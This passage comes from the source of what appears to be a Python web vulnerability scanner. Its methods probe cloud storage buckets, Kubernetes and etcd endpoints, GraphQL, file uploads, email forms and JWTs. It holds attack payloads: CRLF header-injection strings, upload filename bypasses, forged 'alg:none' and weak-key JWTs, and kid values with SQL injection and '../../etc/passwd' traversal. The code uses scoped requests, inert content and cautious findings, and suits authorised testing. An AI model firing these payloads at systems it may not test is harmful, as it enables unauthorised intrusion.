                        'status': result_data['status'],
                        'reason': 'Public Azure Blob container found',
                        'severity': 'HIGH',
                        'category': 'CLOUD_STORAGE',
                        'details': result_data
                    }
                    results.append(result)
                    print(f"  [✓] Azure Blob: {result_data['account']}/{result_data['container']}")
        
        return results
    
    def _test_gcp_bucket_discovery(self) -> List[Dict[str, Any]]:
        """Test for misconfigured GCP Storage buckets"""
        results = []
        print("  [*] Testing GCP Storage buckets...")
        
        # Generate potential bucket names
        target_hostname = urlparse(self.target).hostname or self.domain
        domain_parts = target_hostname.split('.')
        base_name = domain_parts[0] if domain_parts else 'bucket'
        
        bucket_patterns = [
            base_name,
            f"{base_name}-backup",
            f"{base_name}-data",
            f"{base_name}-dev",
            f"{base_name}-prod",
            f"{base_name}-staging",
            f"{base_name}-assets",
            f"{base_name}-public",
            f"{base_name}-private",
            f"{base_name}-uploads",
            f"{base_name}-static",
        ]
        
        def check_gcp_bucket(bucket: str) -> Optional[Dict]:
            try:
                # Try storage.googleapis.com
                url = f"https://storage.googleapis.com/{bucket}"
                resp = self._scoped_safe_request(url, timeout=5)
                
                if resp is not None and resp.status_code in [200, 403]:
                    if resp.status_code == 200:
                        return {
                            'bucket': bucket,
                            'url': url,
                            'status': resp.status_code,
                            'accessible': True
                        }
                    elif 'AccessDenied' in resp.text:
                        return {
                            'bucket': bucket,
                            'url': url,
                            'status': resp.status_code,
                            'accessible': False,
                            'exists': True
                        }
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_gcp_bucket, b): b for b in bucket_patterns}
            
            for future in as_completed(futures):
                result_data = future.result()
                if result_data:
                    severity = 'HIGH' if result_data.get('accessible') else 'LOW'
                    result = {
                        'technique': f"GCP Bucket: {result_data['bucket']}",
                        'bypass': result_data.get('accessible', False),
                        'status': result_data['status'],
                        'reason': 'Public GCP bucket' if result_data.get('accessible') else 'Bucket exists (access denied)',
                        'severity': severity,
                        'category': 'CLOUD_STORAGE',
                        'details': result_data
                    }
                    results.append(result)
                    if result_data.get('accessible'):
                        print(f"  [✓] GCP Bucket: {result_data['bucket']} (public!)")
        
        return results
    
    def _test_serverless_functions(self) -> List[Dict[str, Any]]:
        """Test for exposed serverless function endpoints"""
        results = []
        print("  [*] Testing serverless function endpoints...")
        
        # AWS Lambda function URL patterns
        lambda_paths = [
            '/.netlify/functions/',
            '/api/',
            '/.aws/',
            '/prod/',
            '/dev/',
            '/stage/',
            '/default/',
        ]
        
        function_names = [
            'handler', 'api', 'webhook', 'callback', 'process',
            'auth', 'login', 'register', 'user', 'admin',
            'data', 'upload', 'download', 'export', 'import',
            'test', 'debug', 'health', 'status', 'info'
        ]
        
        test_cases = []
        for path in lambda_paths:
            for func in function_names:
                test_cases.append({
                    'headers': {},
                    'path': f"{path}{func}",
                    'technique': f'Serverless: {path}{func}'
                })
        
        # Also check for Vercel/Netlify patterns
        vercel_paths = [
            '/api/hello',
            '/api/auth',
            '/api/users',
            '/api/data',
            '/_next/data/',
        ]
        
        for path in vercel_paths:
            test_cases.append({
                'headers': {},
                'path': path,
                'technique': f'Vercel/Next: {path}'
            })
        
        batch_results = self._batch_test(
            test_cases, verbose=False, include_observations=True
        )
        
        for r in batch_results:
            if r.get('status') in [200, 201, 400, 401, 403]:
                r['category'] = 'SERVERLESS'
                r['bypass'] = False
                r['kind'] = 'observation'
                r['verification_status'] = 'informational'
                r['severity'] = 'INFO'
                r['reason'] = f"Serverless route candidate returned HTTP {r.get('status')}"
                r['evidence'] = [{
                    'type': 'route_response', 'description': r['reason'],
                    'matched': str(r.get('status', 0)),
                }]
                results.append(r)
                print(f"  [i] Serverless route candidate: {r['technique']}")
        
        return results
    
    def _test_kubernetes_api(self) -> List[Dict[str, Any]]:
        """Test for exposed Kubernetes API endpoints"""
        results = []
        print("  [*] Testing Kubernetes API exposure...")
        
        k8s_endpoints = [
            # Standard K8s API paths
            ('/api', 'K8s API root'),
            ('/api/v1', 'K8s API v1'),
            ('/apis', 'K8s APIs'),
            ('/healthz', 'K8s health'),
            ('/livez', 'K8s liveness'),
            ('/readyz', 'K8s readiness'),
            ('/version', 'K8s version'),
            ('/metrics', 'K8s metrics'),
            
            # Namespace enumeration
            ('/api/v1/namespaces', 'K8s namespaces'),
            ('/api/v1/pods', 'K8s pods'),
            ('/api/v1/services', 'K8s services'),
            ('/api/v1/secrets', 'K8s secrets'),
            ('/api/v1/configmaps', 'K8s configmaps'),
            
            # Dashboard
            ('/dashboard/', 'K8s Dashboard'),
            ('/kubernetes-dashboard/', 'K8s Dashboard alt'),
            
            # Helm/Tiller
            ('/tiller/', 'Helm Tiller'),
            
            # ETCD
            ('/v2/keys', 'etcd keys'),
            ('/v3/kv/range', 'etcd v3'),
        ]
        
        test_cases = [
            {'headers': {}, 'path': path, 'technique': technique}
            for path, technique in k8s_endpoints
        ]
        
        # Also test with common K8s headers
        test_cases.append({
            'headers': {'Authorization': 'Bearer test'},
            'path': '/api/v1/namespaces',
            'technique': 'K8s with Bearer token'
        })
        
        batch_results = self._batch_test(
            test_cases, verbose=False, include_observations=True
        )
        
        for r in batch_results:
            r['category'] = 'KUBERNETES'
            if r.get('status') in [200, 401, 403]:
                excerpt = str((r.get('response') or {}).get('excerpt', ''))
                k8s_signature = re.search(
                    r'(?i)"(?:apiVersion|gitVersion|kind)"\s*:', excerpt
                )
                if r.get('status') == 200 and k8s_signature:
                    r['bypass'] = True
                    r['kind'] = 'suspected'
                    r['verification_status'] = 'candidate'
                    r['confidence'] = 'medium'
                    r['severity'] = 'HIGH'
                    r['reason'] = 'Unauthenticated Kubernetes API signature returned'
                    r['evidence'] = [{
                        'type': 'kubernetes_api_signature',
                        'description': r['reason'],
                        'matched': k8s_signature.group(0),
                    }]
                    results.append(r)
                    print(f"  [!] K8s API candidate: {r['technique']}")
                elif r.get('status') in [401, 403] and k8s_signature:
                    r['bypass'] = False
                    r['kind'] = 'observation'
                    r['verification_status'] = 'informational'
                    r['severity'] = 'INFO'
                    r['reason'] = 'Kubernetes API signature observed; authentication required'
                    results.append(r)
        
        return results
    
    def _test_cloud_provider_detection(self) -> List[Dict[str, Any]]:
        """Enhanced cloud provider fingerprinting"""
        results = []
        print("  [*] Detecting cloud provider...")
        
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            
            cloud_indicators = {
                'AWS': {
                    'headers': ['x-amz-', 'x-amzn-', 'x-aws-'],
                    'patterns': ['amazonaws.com', 'cloudfront.net', 'elasticbeanstalk'],
                },
                'Azure': {
                    'headers': ['x-azure-', 'x-ms-'],
                    'patterns': ['azurewebsites.net', 'azure.com', 'cloudapp.azure'],
                },
                'GCP': {
                    'headers': ['x-goog-', 'x-cloud-'],
                    'patterns': ['googleapis.com', 'appspot.com', 'cloudfunctions.net'],
                },
                'DigitalOcean': {
                    'headers': ['x-do-'],
                    'patterns': ['digitaloceanspaces.com', 'ondigitalocean.app'],
                },
                'Heroku': {
                    'headers': ['x-heroku-'],
                    'patterns': ['herokuapp.com', 'herokucdn.com'],
                },
                'Vercel': {
                    'headers': ['x-vercel-'],
                    'patterns': ['vercel.app', 'now.sh'],
                },
                'Netlify': {
                    'headers': ['x-nf-'],
                    'patterns': ['netlify.app', 'netlify.com'],
                },
                'Render': {
                    'headers': [],
                    'patterns': ['onrender.com', 'render.com'],
                },
                'Railway': {
                    'headers': [],
                    'patterns': ['railway.app'],
                },
                'Fly.io': {
                    'headers': ['fly-'],
                    'patterns': ['fly.dev', 'fly.io'],
                },
            }
            
            detected = []
            for provider, indicators in cloud_indicators.items():
                confidence = 0
                matched = []
                
                # Check headers
                for header_prefix in indicators['headers']:
                    for h in headers_lower:
                        if h.startswith(header_prefix):
                            confidence += 40
                            matched.append(f"Header: {h}")
                
                # Check URL/body patterns
                for pattern in indicators['patterns']:
                    if pattern in self.target.lower() or pattern in resp.text.lower():
                        confidence += 50
                        matched.append(f"Pattern: {pattern}")
                
                if confidence > 0:
                    detected.append({
                        'provider': provider,
                        'confidence': min(confidence, 100),
                        'indicators': matched
                    })
            
            for d in detected:
                result = {
                    'technique': f"Cloud Provider: {d['provider']}",
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': f"Confidence: {d['confidence']}% - {', '.join(d['indicators'][:2])}",
                    'severity': 'INFO',
                    'category': 'CLOUD_DETECTION',
                    'details': d
                }
                results.append(result)
                print(f"  [+] Cloud: {d['provider']} (Confidence: {d['confidence']}%)")
                
        except Exception as e:
            logger.debug(f"Cloud detection error: {e}")
        
        return results

    # ============================================================================
    # ADDITIONAL SPECIALIZED TESTS
    # ============================================================================
    
    def _test_api_versioning_bypass(self) -> List[Dict[str, Any]]:
        """Test for unprotected API version endpoints"""
        results = []
        print("  [*] Testing API version bypass...")
        
        api_versions = [
            '/v1/', '/v2/', '/v3/', '/v4/',
            '/api/v1/', '/api/v2/', '/api/v3/',
            '/api/1/', '/api/2/',
            '/api/1.0/', '/api/2.0/',
            '/api/latest/', '/api/beta/', '/api/alpha/',
            '/api/internal/', '/api/private/',
            '/api/legacy/', '/api/old/',
            '/_api/', '/~api/',
        ]
        
        endpoints = [
            'users', 'admin', 'config', 'settings', 'debug',
            'health', 'status', 'info', 'docs', 'swagger'
        ]
        
        test_cases = []
        for version in api_versions:
            test_cases.append({
                'headers': {},
                'path': version,
                'technique': f'API Version: {version}'
            })
            for endpoint in endpoints[:5]:
                test_cases.append({
                    'headers': {},
                    'path': f'{version}{endpoint}',
                    'technique': f'API: {version}{endpoint}'
                })
        
        batch_results = self._batch_test(
            test_cases, verbose=False, include_observations=True
        )
        
        for r in batch_results:
            r['category'] = 'API_VERSIONING'
            if r.get('status') in [200, 201]:
                r['bypass'] = False
                r['kind'] = 'observation'
                r['verification_status'] = 'informational'
                r['severity'] = 'INFO'
                r['reason'] = 'API version route responded; authorization bypass not proven'
                results.append(r)
        
        return results
    
    def _test_mass_assignment(self) -> List[Dict[str, Any]]:
        """Test for mass assignment vulnerabilities"""
        results = []
        print("  [*] Testing mass assignment...")
        
        # Common mass assignment targets
        dangerous_params = [
            'admin', 'is_admin', 'isAdmin', 'role', 'roles',
            'privilege', 'privileges', 'permission', 'permissions',
            'user_type', 'userType', 'type', 'level', 'access',
            'verified', 'is_verified', 'active', 'is_active',
            'approved', 'is_approved', 'status', 'account_type',
            'balance', 'credit', 'points', 'id', 'user_id',
            'created_at', 'updated_at', 'password', 'email_verified'
        ]
        
        for param in dangerous_params[:10]:  # Limit tests
            try:
                # Test via JSON
                resp = self._scoped_safe_request(
                    self.target, method='POST',
                    json={param: True, 'test': 'value'},
                    timeout=self.timeout,
                    verify=False
                )
                
                if resp is not None and resp.status_code in [200, 201]:
                    if param in resp.text.lower():
                        result = {
                            'technique': f'Mass-assignment input reflection: {param}',
                            'bypass': False,
                            'status': resp.status_code,
                            'reason': (f'Parameter {param} was reflected/accepted; '
                                       'a privileged state change and readback were not proven'),
                            'severity': 'INFO', 'category': 'MASS_ASSIGNMENT',
                            'kind': 'observation',
                            'verification_status': 'informational',
                        }
                        results.append(result)
                        print(f"  [i] Mass-assignment input accepted: {param}; impact unverified")
                        
            except Exception as e:
                logger.debug(f"Mass assignment test error: {e}")
        
        return results
    
    def _test_idor_detection(self) -> List[Dict[str, Any]]:
        """Test for Insecure Direct Object Reference patterns"""
        results = []
        print("  [*] Testing IDOR patterns...")
        
        # Common IDOR parameters
        idor_endpoints = [
            '/user/1', '/user/2', '/user/100',
            '/users/1', '/users/2',
            '/profile/1', '/profile/admin',
            '/account/1', '/account/2',
            '/order/1', '/order/1000',
            '/invoice/1', '/document/1',
            '/file/1', '/download/1',
            '/api/user/1', '/api/users/1',
            '?id=1', '?id=2', '?user_id=1', '?user_id=2',
            '?uid=1', '?account=1', '?order=1',
        ]
        
        response_sizes = {}
        
        for endpoint in idor_endpoints:
            try:
                if '?' in endpoint:
                    url = f"{self.target}{endpoint}"
                else:
                    url = f"{self.target}{endpoint}"
                
                resp = self._scoped_safe_request(url, timeout=self.timeout)
                
                if resp is not None and resp.status_code == 200:
                    size = len(resp.content)
                    # Track response sizes to detect enumerable resources
                    base_endpoint = endpoint.rstrip('0123456789')
                    if base_endpoint not in response_sizes:
                        response_sizes[base_endpoint] = []
                    response_sizes[base_endpoint].append({
                        'endpoint': endpoint,
                        'size': size,
                        'status': resp.status_code
                    })
                    
            except Exception as e:
                logger.debug(f"IDOR test error: {e}")
        
        # Analyze patterns
        for base, responses in response_sizes.items():
            if len(responses) >= 2:
                sizes = [r['size'] for r in responses]
                # Different sizes might indicate IDOR
                if len(set(sizes)) > 1 and max(sizes) > 100:
                    result = {
                        'technique': f'Object route pattern: {base}',
                        'bypass': False,
                        'status': 200,
                        'reason': ('Multiple object-shaped routes returned different content; '
                                   'IDOR requires two identities and ownership proof'),
                        'severity': 'INFO',
                        'category': 'IDOR',
                        'kind': 'observation',
                        'verification_status': 'informational',
                        'confidence': 'medium',
                        'evidence': [{
                            'type': 'object_route_variation',
                            'description': 'Route enumeration signal only',
                            'matched': f'{len(responses)} responses / {len(set(sizes))} sizes',
                        }],
                        'details': {'responses': responses}
                    }
                    results.append(result)
                    print(f"  [i] Object route pattern: {base}; IDOR not proven")
        
        return results
    
    def _test_business_logic_flaws(self) -> List[Dict[str, Any]]:
        """Test for common business logic vulnerabilities"""
        results = []
        print("  [*] Testing business logic flaws...")
        
        # Negative value tests
        negative_tests = [
            ('?amount=-1', 'Negative amount'),
            ('?quantity=-100', 'Negative quantity'),
            ('?price=-50', 'Negative price'),
            ('?count=-1', 'Negative count'),
            ('?discount=200', 'Over 100% discount'),
            ('?discount=-50', 'Negative discount'),
        ]
        
        # Boundary tests
        boundary_tests = [
            ('?amount=0', 'Zero amount'),
            ('?amount=0.001', 'Micro amount'),
            ('?amount=99999999999', 'Large amount'),
            ('?quantity=0', 'Zero quantity'),
            ('?price=0', 'Zero price'),
        ]
        
        # Type confusion
        type_tests = [
            ('?amount[]=1', 'Array injection'),
            ('?amount=null', 'Null value'),
            ('?amount=undefined', 'Undefined value'),
            ('?amount=NaN', 'NaN value'),
            ('?amount=true', 'Boolean value'),
        ]
        
        all_tests = negative_tests + boundary_tests + type_tests
        
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Logic: {technique}'}
            for path, technique in all_tests
        ]
        
        batch_results = self._batch_test(test_cases, verbose=False)
        
        for r in batch_results:
            r['category'] = 'BUSINESS_LOGIC'
            if r.get('status') in [200, 201]:
                r['bypass'] = False
                r['kind'] = 'observation'
                r['verification_status'] = 'informational'
                r['severity'] = 'INFO'
                r['reason'] = ('Boundary input received a success status; no durable '
                               'transaction/state invariant violation was proven')
                r['evidence'] = [{
                    'type': 'input_acceptance', 'description': r['reason'],
                    'matched': str(r.get('status')),
                }]
                results.append(r)
        
        return results
    
    def _test_email_header_injection(self) -> List[Dict[str, Any]]:
        """Test for email header injection in contact forms"""
        results = []
        print("  [*] Testing email header injection...")
        
        # Common form endpoints
        form_endpoints = [
            '/contact', '/contact-us', '/send', '/mail', '/email',
            '/feedback', '/support', '/enquiry', '/inquiry', '/message'
        ]
        
        # Email injection payloads
        injection_payloads = [
            'blackthorn-sender@example.invalid%0ABcc:blackthorn-probe@example.invalid',
            'blackthorn-sender@example.invalid\r\nBcc:blackthorn-probe@example.invalid',
            'blackthorn-sender@example.invalid%0ACc:blackthorn-probe@example.invalid',
            'blackthorn-sender@example.invalid\nSubject:Blackthorn-Probe',
            'blackthorn-sender@example.invalid%0AContent-Type:text/plain',
        ]
        
        for endpoint in form_endpoints:
            for payload in injection_payloads[:3]:
                try:
                    resp = self._scoped_safe_request(
                        f"{self.target}{endpoint}", method='POST',
                        data={
                            'email': payload,
                            'name': 'test',
                            'message': 'test',
                            'subject': 'test'
                        },
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if resp is not None and resp.status_code in [200, 302]:
                        # Check for injection acceptance
                        if 'thank' in resp.text.lower() or 'success' in resp.text.lower() or resp.status_code == 302:
                            result = {
                                'technique': f'Email delimiter acceptance: {endpoint}',
                                'bypass': False,
                                'status': resp.status_code,
                                'reason': ('Form accepted an address containing header delimiters; '
                                           'delivery/header injection was not observed'),
                                'severity': 'INFO',
                                'category': 'EMAIL_INJECTION',
                                'kind': 'observation',
                                'verification_status': 'informational',
                                'confidence': 'medium',
                                'method': 'POST', 'path': endpoint,
                                'url': f'{self.target}{endpoint}',
                                'payload': payload,
                                'request': {
                                    'method': 'POST', 'url': f'{self.target}{endpoint}',
                                    'path': endpoint, 'headers': {},
                                    'body': {'email': payload, 'name': 'test',
                                             'message': 'test', 'subject': 'test'},
                                },
                                'response': {'status': resp.status_code},
                                'evidence': [{
                                    'type': 'input_acceptance',
                                    'description': ('Application displayed a form-success '
                                                    'response for delimiter-bearing input'),
                                    'matched': str(resp.status_code),
                                }],
                                '_no_reconfirm': True,
                            }
                            results.append(result)
                            print(f"  [i] Email delimiter input accepted at {endpoint}")
                            break
                            
                except Exception as e:
                    logger.debug(f"Email injection test error: {e}")
        
        return results
    
    def _test_file_upload_bypass(self) -> List[Dict[str, Any]]:
        """Test for file upload restriction bypasses"""
        results = []
        print("  [*] Testing file upload bypasses...")
        
        # Common upload endpoints
        upload_endpoints = [
            '/upload', '/api/upload', '/file/upload', '/files',
            '/attachments', '/media', '/images', '/documents'
        ]
        suffix = str(random.randrange(10**8, 10**9))
        
        # Bypass techniques (filename, content-type, description)
        bypass_tests = [
            (f'blackthorn-{suffix}.php', 'image/jpeg', 'PHP extension as JPEG'),
            (f'blackthorn-{suffix}.php.jpg', 'image/jpeg', 'Double extension'),
            (f'blackthorn-{suffix}.jpg.php', 'image/jpeg', 'Reverse double extension'),
            (f'blackthorn-{suffix}.pHp', 'application/octet-stream', 'Case variation'),
            (f'blackthorn-{suffix}.php%00.jpg', 'image/jpeg', 'Null-byte filename'),
            (f'blackthorn-{suffix}.php;.jpg', 'image/jpeg', 'Semicolon filename'),
            (f'blackthorn-{suffix}.php::$DATA', 'application/octet-stream', 'NTFS ADS filename'),
            (f'blackthorn-{suffix}.phtml', 'text/plain', 'Alternative PHP extension'),
            (f'blackthorn-{suffix}.php5', 'text/plain', 'PHP5 extension'),
            (f'blackthorn-{suffix}.shtml', 'text/plain', 'SSI extension'),
            (f'blackthorn-{suffix}.txt', 'text/plain', 'Control extension'),
        ]

        # Deliberately inert content: filename validation can be observed without
        # uploading executable server-side code.
        inert_content = (b'\xff\xd8\xff\xe0BLACKTHORN-INERT-UPLOAD-' +
                         suffix.encode('ascii'))
        
        for endpoint in upload_endpoints[:3]:
            for filename, content_type, technique in bypass_tests[:5]:
                try:
                    files = {
                        'file': (filename, inert_content, content_type)
                    }
                    
                    resp = self._scoped_safe_request(
                        f"{self.target}{endpoint}", method='POST',
                        files=files,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if resp is not None and resp.status_code in [200, 201]:
                        if 'success' in resp.text.lower() or 'uploaded' in resp.text.lower():
                            result = {
                                'technique': f'Upload validation candidate: {technique}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': (f'Inert file {filename} was accepted at {endpoint}; '
                                           'retrieval, content-type confusion, and execution '
                                           'are not proven'),
                                'severity': 'LOW',
                                'category': 'FILE_UPLOAD',
                                'kind': 'suspected',
                                'verification_status': 'candidate',
                                'confidence': 'medium',
                                'method': 'POST', 'path': endpoint,
                                'url': f'{self.target}{endpoint}',
                                'payload': filename,
                                'request': {
                                    'method': 'POST', 'url': f'{self.target}{endpoint}',
                                    'path': endpoint,
                                    'headers': {'Content-Type': 'multipart/form-data'},
                                    'body': f'inert upload file={filename}',
                                },
                                'response': {
                                    'status': resp.status_code,
                                    'excerpt': resp.text[:300],
                                },
                                'evidence': [{
                                    'type': 'upload_acceptance',
                                    'description': ('Application returned an explicit upload '
                                                    'success response'),
                                    'matched': filename,
                                }],
                                '_no_reconfirm': True,
                            }
                            results.append(result)
                            print(f"  [!] Upload validation candidate: {technique} at {endpoint}")
                            break
                            
                except Exception as e:
                    logger.debug(f"Upload test error: {e}")
        
        return results
    
    def _test_response_splitting(self) -> List[Dict[str, Any]]:
        """Require an exact randomized response-header canary.

        A response-size change after CR/LF input is not response splitting, and
        body reflection cannot prove a new HTTP message boundary. Only a header
        that the target actually emits is promoted.
        """
        print("  [*] Testing response splitting with exact header canaries...")
        suffix = str(random.randrange(10**8, 10**9))
        header_name = f'X-Blackthorn-Split-{suffix}'
        header_value = f'bt-split-{suffix}'
        test_cases = []
        for parameter in ('lang', 'redirect', 'next', 'callback'):
            payload = f'clean%0d%0a{header_name}:%20{header_value}'
            test_cases.append({
                'headers': {},
                'path': f'/?{parameter}={payload}',
                'technique': f'Response splitting: {parameter}',
                'category': 'RESPONSE_SPLITTING',
                'parameter': parameter, 'payload': payload,
                'detector_id': 'response-splitting-header-v2',
                'oracle': {
                    'type': 'header', 'name': header_name,
                    'value': header_value, 'severity': 'HIGH',
                    'reason': (f'Injected response header observed: '
                               f'{header_name}: {header_value}'),
                },
            })
        return [
            result for result in self._batch_test(test_cases)
            if self._result_has_evidence(result, 'response_header_injection')
        ]
    
    def _test_clickjacking(self) -> List[Dict[str, Any]]:
        """Test for clickjacking vulnerabilities"""
        results = []
        print("  [*] Testing clickjacking protection...")
        
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            
            # Check X-Frame-Options
            xfo = headers_lower.get('x-frame-options', '').upper()
            
            # Check CSP frame-ancestors
            csp = headers_lower.get('content-security-policy', '')
            has_frame_ancestors = 'frame-ancestors' in csp.lower()
            
            vulnerable = False
            reason = ""
            
            if not xfo and not has_frame_ancestors:
                vulnerable = True
                reason = "No X-Frame-Options or CSP frame-ancestors"
            elif xfo and xfo not in ['DENY', 'SAMEORIGIN']:
                if 'ALLOW-FROM' in xfo:
                    vulnerable = True
                    reason = f"Deprecated ALLOW-FROM: {xfo}"
            
            if vulnerable:
                result = {
                    'technique': 'Clickjacking Vulnerability',
                    'bypass': True,
                    'status': resp.status_code,
                    'reason': reason,
                    'severity': 'MEDIUM',
                    'category': 'CLICKJACKING'
                }
                results.append(result)
                print(f"  [!] Clickjacking: {reason}")
            else:
                result = {
                    'technique': 'Clickjacking Protection',
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': f"Protected: XFO={xfo or 'N/A'}, CSP frame-ancestors={has_frame_ancestors}",
                    'severity': 'INFO',
                    'category': 'CLICKJACKING'
                }
                results.append(result)
                
        except Exception as e:
            logger.debug(f"Clickjacking test error: {e}")
        
        return results

    # ============================================================================
    # ADVANCED PROTOCOL ATTACKS (v1.4)
    # ============================================================================
    
    def _test_graphql_deep_testing(self) -> List[Dict[str, Any]]:
        """Advanced GraphQL security testing - introspection, batching DoS, depth bypass"""
        results = []
        print("  [*] Testing advanced GraphQL attacks...")
        
        graphql_endpoints = [
            '/graphql', '/api/graphql', '/v1/graphql', '/gql',
            '/query', '/api/query', '/graphiql', '/playground'
        ]
        
        # Introspection query to dump entire schema
        introspection_query = '''
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    ...FullType
                }
                directives {
                    name
                    description
                    locations
                    args { ...InputValue }
                }
            }
        }
        fragment FullType on __Type {
            kind
            name
            description
            fields(includeDeprecated: true) {
                name
                description
                args { ...InputValue }
                type { ...TypeRef }
                isDeprecated
                deprecationReason
            }
            inputFields { ...InputValue }
            interfaces { ...TypeRef }
            enumValues(includeDeprecated: true) {
                name
                description
                isDeprecated
                deprecationReason
            }
            possibleTypes { ...TypeRef }
        }
        fragment InputValue on __InputValue {
            name
            description
            type { ...TypeRef }
            defaultValue
        }
        fragment TypeRef on __Type {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                    }
                }
            }
        }
        '''
        
        # Batching attack - multiple operations in one request
        batching_query = [
            {"query": "query { __typename }"},
            {"query": "query { __typename }"},
            {"query": "query { __typename }"},
            {"query": "query { __typename }"},
            {"query": "query { __typename }"},
        ] * 20  # 100 queries
        
        # Deep nesting attack (depth limit bypass)
        depth_query = '''
        query {
            user {
                friends {
                    friends {
                        friends {
                            friends {
                                friends {
                                    friends {
                                        friends {
                                            friends {
                                                friends {
                                                    friends {
                                                        id
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        '''
        
        # Alias-based DoS
        alias_query = "query { " + " ".join([f"a{i}: __typename" for i in range(1000)]) + " }"
        
        # Circular fragment attack
        circular_query = '''
        fragment A on Query { ...B }
        fragment B on Query { ...A }
        query { ...A }
        '''
        
        # Field suggestion exploitation
        field_suggestion_query = '''
        query {
            __type(name: "User") {
                fields {
                    name
                    type { name kind }
                }
            }
        }
        '''
        
        for endpoint in graphql_endpoints:
            url = f"{self.target}{endpoint}"
            
            # Test introspection
            try:
                resp = self._scoped_safe_request(
                    url, method='POST',
                    json={'query': introspection_query},
                    headers={'Content-Type': 'application/json'},
                    timeout=self.timeout,
                    verify=False
                )
                
                if resp is not None and resp.status_code == 200:
                    if '__schema' in resp.text or 'queryType' in resp.text:
                        result = {
                            'technique': f'GraphQL Introspection: {endpoint}',
                            'bypass': False,
                            'status': resp.status_code,
                            'reason': ('Full schema introspection is enabled; record as '
                                       'policy context, not a vulnerability by itself'),
                            'severity': 'INFO', 'category': 'GRAPHQL_ATTACK',
                            'kind': 'observation',
                            'verification_status': 'informational',
                        }
                        results.append(result)
                        print(f"  [✓] GraphQL Introspection enabled at {endpoint}")
                        
            except Exception as e:
                logger.debug(f"GraphQL introspection error: {e}")
            
            # Test batching
            try:
                resp = self._scoped_safe_request(
                    url, method='POST',
                    json=batching_query[:10],  # Test with 10 first
                    headers={'Content-Type': 'application/json'},
                    timeout=self.timeout + 5,
                    verify=False
                )
                
                if resp is not None and resp.status_code == 200:
                    if isinstance(resp.json(), list):
                        result = {
                            'technique': f'GraphQL Batching DoS: {endpoint}',
                            'bypass': False,
                            'status': resp.status_code,
                            'reason': ('Query batching is supported; rate-limit or '
                                       'resource impact has not been demonstrated'),
                            'severity': 'INFO', 'category': 'GRAPHQL_ATTACK',
                            'kind': 'observation',
                            'verification_status': 'informational',
                        }
                        results.append(result)
                        print(f"  [!] GraphQL Batching enabled at {endpoint}")
                        
            except Exception as e:
                logger.debug(f"GraphQL batching error: {e}")
            
            # Test depth limit
            try:
                resp = self._scoped_safe_request(
                    url, method='POST',
                    json={'query': depth_query},
                    headers={'Content-Type': 'application/json'},
                    timeout=self.timeout,
                    verify=False
                )
                
                if resp is not None and resp.status_code == 200:
                    if 'errors' not in resp.text.lower() or 'depth' not in resp.text.lower():
                        result = {
                            'technique': f'GraphQL Depth Bypass: {endpoint}',
                            'bypass': False,
                            'status': resp.status_code,
                            'reason': ('Nested query was accepted; no measured resource '
                                       'exhaustion or policy bypass was demonstrated'),
                            'severity': 'INFO', 'category': 'GRAPHQL_ATTACK',
                            'kind': 'observation',
                            'verification_status': 'informational',
                        }
                        results.append(result)
                        
            except Exception as e:
                logger.debug(f"GraphQL depth error: {e}")
        
        return results
    
    def _test_jwt_attacks(self) -> List[Dict[str, Any]]:
        """Comprehensive JWT attack testing - algorithm confusion, key injection"""
        results = []
        print("  [*] Testing JWT/Token attacks...")
        
        import base64
        import hmac
        
        # Get a sample response to find JWT tokens
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            # Look for JWTs in response
            jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
            found_jwts = jwt_pattern.findall(resp.text)
            
            # Check cookies for JWTs
            for cookie in resp.cookies:
                if jwt_pattern.match(str(cookie.value)):
                    found_jwts.append(cookie.value)
            
            # Check headers
            for header_value in resp.headers.values():
                matches = jwt_pattern.findall(header_value)
                found_jwts.extend(matches)
                
        except Exception as e:
            logger.debug(f"JWT discovery error: {e}")
            found_jwts = []
        
        # JWT attack payloads
        jwt_attacks = []
        
        # Algorithm None attack
        none_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
        none_payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip('=')
        none_jwt = f"{none_header}.{none_payload}."
        jwt_attacks.append(('alg:none', none_jwt))
        
        # Algorithm None variations
        for alg in ['None', 'NONE', 'nOnE']:
            header = base64.urlsafe_b64encode(f'{{"alg":"{alg}","typ":"JWT"}}'.encode()).decode().rstrip('=')
            jwt_attacks.append((f'alg:{alg}', f"{header}.{none_payload}."))
        
        # Empty signature
        hs256_header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip('=')
        jwt_attacks.append(('empty_sig', f"{hs256_header}.{none_payload}."))
        
        # Weak key signatures (common passwords)
        weak_keys = ['secret', 'password', '123456', 'key', 'private', 'jwt_secret']
        for key in weak_keys:
            try:
                message = f"{hs256_header}.{none_payload}"
                signature = base64.urlsafe_b64encode(
                    hmac.new(key.encode(), message.encode(), 'sha256').digest()
                ).decode().rstrip('=')
                jwt_attacks.append((f'weak_key:{key}', f"{message}.{signature}"))
            except:
                pass
        
        # KID injection attacks
        kid_injections = [
            ('kid_sqli', '{"alg":"HS256","typ":"JWT","kid":"key\' OR \'1\'=\'1"}'),
            ('kid_traversal', '{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}'),
            ('kid_devnull', '{"alg":"HS256","typ":"JWT","kid":"/dev/null"}'),
        ]
        
        for name, header_json in kid_injections:
